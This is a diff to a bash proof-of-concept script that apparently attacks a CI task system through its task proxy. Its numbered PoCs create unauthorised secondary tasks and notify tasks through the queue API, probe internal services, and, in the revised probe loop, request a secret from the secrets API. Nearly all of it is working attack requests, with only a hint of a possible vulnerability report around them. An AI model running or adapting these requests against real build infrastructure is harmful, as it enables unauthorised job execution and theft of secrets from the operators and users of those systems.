@@ -47,13 +47,20 @@ else
 fi
 rm -f "$TMP_SECRET"
 
+gen_slugid() {
+  python3 - <<'PY'
+import base64, uuid
+print(base64.urlsafe_b64encode(uuid.uuid4().bytes).decode().rstrip("="))
+PY
+}
+
 # ------------------------------------------------
 # PoC 02: Secondary Task Creation
 # ------------------------------------------------
 echo ""
 echo "[*] === PoC 02: Secondary Task Creation ==="
 
-NEW_TASK_ID="poc02-$(date +%s)-${RANDOM}"
+NEW_TASK_ID="$(gen_slugid)"
 DL=$(date -u -d '+1 hour' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1H +%Y-%m-%dT%H:%M:%S.000Z)
 EXP=$(date -u -d '+1 day' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1d +%Y-%m-%dT%H:%M:%S.000Z)
 
@@ -81,9 +88,9 @@ cat > /tmp/poc02_task.json <<EOF
 EOF
 
 STATUS=$(curl -s -o /tmp/poc02_resp.json -w "%{http_code}" \
-  -X POST -H "Content-Type: application/json" -d @/tmp/poc02_task.json \
+  -X PUT -H "Content-Type: application/json" -d @/tmp/poc02_task.json \
   --max-time 15 \
-  "${PROXY_URL}/api/queue/v1/create-task/${NEW_TASK_ID}" 2>/dev/null || echo "000")
+  "${PROXY_URL}/api/queue/v1/task/${NEW_TASK_ID}" 2>/dev/null || echo "000")
 
 echo "[*] queue.createTask status: ${STATUS}"
 
@@ -106,7 +113,7 @@ rm -f /tmp/poc02_task.json /tmp/poc02_resp.json
 echo ""
 echo "[*] === PoC 03: Notify Route ==="
 
-NOTIFY_TASK_ID="poc03-$(date +%s)-${RANDOM}"
+NOTIFY_TASK_ID="$(gen_slugid)"
 DL=$(date -u -d '+1 hour' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1H +%Y-%m-%dT%H:%M:%S.000Z)
 EXP=$(date -u -d '+1 day' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1d +%Y-%m-%dT%H:%M:%S.000Z)
 
@@ -135,10 +142,9 @@ cat > /tmp/poc03_task.json <<EOF
 EOF
 
 STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
-  -X POST -H "Content-Type: application/json" -d @/tmp/poc03_task.json \
+  -X PUT -H "Content-Type: application/json" -d @/tmp/poc03_task.json \
   --max-time 15 \
-  "${PROXY_URL}/api/queue/v1/create-task/${NOTIFY_TASK_ID}" 2>/dev/null || echo "000")
-
+  "${PROXY_URL}/api/queue/v1/task/${NOTIFY_TASK_ID}" 2>/dev/null || echo "000")
 echo "[*] createTask status: ${STATUS}"
 
 if [ "${STATUS}" = "200" ]; then
@@ -146,24 +152,21 @@ if [ "${STATUS}" = "200" ]; then
     echo "[*] Task: ${ROOT_URL}/tasks/${NOTIFY_TASK_ID}"
 else
     echo "[*] FAILED (status: ${STATUS})"
+fi
+
 # PoC 04: Internal Service Probe
 # ------------------------------------------------
 
 for svc in \
-  "http://auth/" \
-  "http://queue/" \
-  "http://hooks/" \
-  "http://notify/" \
-  "http://index/" \
-  "http://github/" \
-  "http://web-server/" \
-  "${PROXY_URL}/"; do
+  "${PROXY_URL}/api/secrets/v1/secret/${SECRET_NAME}" \
+  "${PROXY_URL}/api/queue/v1/task/${TASK_ID}/status"
+do
     RESULT=$(curl -s -o /dev/null -w "%{http_code},%{size_download}" \
       --max-time 5 --connect-timeout 3 \
       "$svc" 2>/dev/null || echo "000,0")
     S=$(echo "$RESULT" | cut -d',' -f1)
     L=$(echo "$RESULT" | cut -d',' -f2)
-    printf "%-25s | %-6s | %-10s\n" "$svc" "$S" "${L}b"
+    printf "%-60s | %-6s | %-10s\n" "$svc" "$S" "${L}b"
 done
 
 echo ""
